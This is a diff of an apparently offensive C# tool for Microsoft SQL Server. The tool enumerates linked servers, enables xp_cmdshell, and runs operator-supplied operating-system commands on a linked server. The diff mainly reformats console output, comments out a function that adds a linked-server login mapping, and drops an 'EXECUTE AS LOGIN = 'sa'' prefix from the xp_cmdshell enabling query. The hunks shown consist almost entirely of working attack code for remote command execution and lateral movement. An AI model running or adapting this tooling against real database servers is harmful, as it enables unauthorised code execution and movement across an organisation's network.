@@ -115,10 +115,10 @@ namespace SQL
                             continue;
                         }
 
-                        Console.WriteLine("Available linked servers:");
+                        Console.WriteLine("\nAvailable linked servers:\n");
                         for (int i = 0; i < linkedServers.Count; i++)
                         {
-                            Console.WriteLine($"\t{i + 1}. {linkedServers[i]}");
+                            Console.WriteLine($"\t{i + 1}. {linkedServers[i]}\n");
                         }
 
                         Console.Write("Enter the number of the linked server to execute commands on: ");
@@ -235,7 +235,7 @@ namespace SQL
                 Console.WriteLine("\nReverted impersonation before executing commands on linked server.\n");
 
                 // Ensure login mapping exists for the linked server
-                CreateLoginMapping(con, linkedServer);
+                // CreateLoginMapping(con, linkedServer);
 
                 Console.WriteLine($"\nExecuting commands on linked server: {linkedServer}\n");
 
@@ -251,7 +251,7 @@ namespace SQL
                 }
                 else if (actionChoice == "2")
                 {
-                    Console.Write("Enter the full command to execute: ");
+                    Console.Write("\nEnter the full command to execute: ");
                     string userCommand = Console.ReadLine();
 
                     if (string.IsNullOrWhiteSpace(userCommand))
@@ -273,21 +273,21 @@ namespace SQL
             }
         }
 
-        static void CreateLoginMapping(SqlConnection con, string linkedServer)
-        {
-            try
-            {
-                // Create login mapping for the linked server
-                string createMappingCmd = $"EXEC sp_addlinkedsrvlogin @rmtsrvname = '{linkedServer}', @useself = 'false', @locallogin = NULL, @rmtuser = 'remote_user', @rmtpassword = 'remote_password';";
-                SqlCommand command = new SqlCommand(createMappingCmd, con);
-                command.ExecuteNonQuery();
-                Console.WriteLine($"Login mapping created for linked server {linkedServer}.");
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Error creating login mapping for linked server: " + ex.Message);
-            }
-        }
+        //static void CreateLoginMapping(SqlConnection con, string linkedServer)
+        //{
+        //    try
+        //    {
+        //        // Create login mapping for the linked server
+        //        string createMappingCmd = $"EXEC sp_addlinkedsrvlogin @rmtsrvname = '{linkedServer}', @useself = 'false', @locallogin = NULL, @rmtuser = 'remote_user', @rmtpassword = 'remote_password';";
+        //        SqlCommand command = new SqlCommand(createMappingCmd, con);
+        //        command.ExecuteNonQuery();
+        //        Console.WriteLine($"Login mapping created for linked server {linkedServer}.");
+        //    }
+        //    catch (Exception ex)
+        //    {
+        //        Console.WriteLine("Error creating login mapping for linked server: " + ex.Message);
+        //    }
+        //}
 
         static void EnableXpCmdShellOnLinkedServer(SqlConnection con, string linkedServer)
         {
@@ -301,7 +301,7 @@ namespace SQL
                 command = new SqlCommand(enablexpcmdshell, con);
                 reader = command.ExecuteReader();
                 reader.Close();
-                Console.WriteLine($"Successfully enabled xp_cmdshell on {linkedServer}");
+                Console.WriteLine($"\n[+] Successfully enabled xp_cmdshell on {linkedServer}\n");
             }
             catch (Exception ex)
             {
@@ -502,7 +502,7 @@ namespace SQL
             try
             {
                 // Enable xp_cmdshell if not already enabled
-                string enableCmd = "EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
+                string enableCmd = "EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                 SqlCommand enableCommand = new SqlCommand(enableCmd, con);
                 enableCommand.ExecuteNonQuery();
                 Console.WriteLine("Enabled xp_cmdshell.\n");
